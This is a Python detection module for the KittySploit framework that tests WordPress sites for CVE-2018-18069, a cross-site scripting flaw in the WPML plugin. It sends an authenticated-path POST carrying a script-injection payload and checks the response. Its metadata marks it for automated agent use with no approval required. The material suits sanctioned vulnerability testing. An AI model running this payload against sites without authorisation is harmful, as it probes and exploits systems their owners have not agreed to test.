#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress plugin sitepress-multilingual-cms 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress sitepress-multilingual-cms 3.6.3 - Cross-Site Scripting Detection',
        'description': 'WordPress plugin sitepress-multilingual-cms 3.6.3 is vulnerable to cross-site scripting in process_forms via any locale_file_name_ parameter (such as locale_file_name_en) in an authenticated theme-localization.php request to wp-admin/admin.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'wordpress', 'xss', 'plugin', 'wpml', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://0x62626262.wordpress.com/2018/10/08/sitepress-multilingual-cms-plugin-unauthenticated-stored-xss/',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-18069',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2018-18069',
    }

    def run(self):
        path = '/wp-admin/admin.php'
        r = self.http_request(method='POST', path=path, allow_redirects=True, data='icl_post_action=save_theme_localization&locale_file_name_en=EN"><script>alert(0);</script>\n')
        if not r or r.status_code != 200:
            return False
        body = (r.text or "").lower()
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
        body_any = ('_icl_current_admin_language',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason='WordPress sitepress-multilingual-cms 3.6.3 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

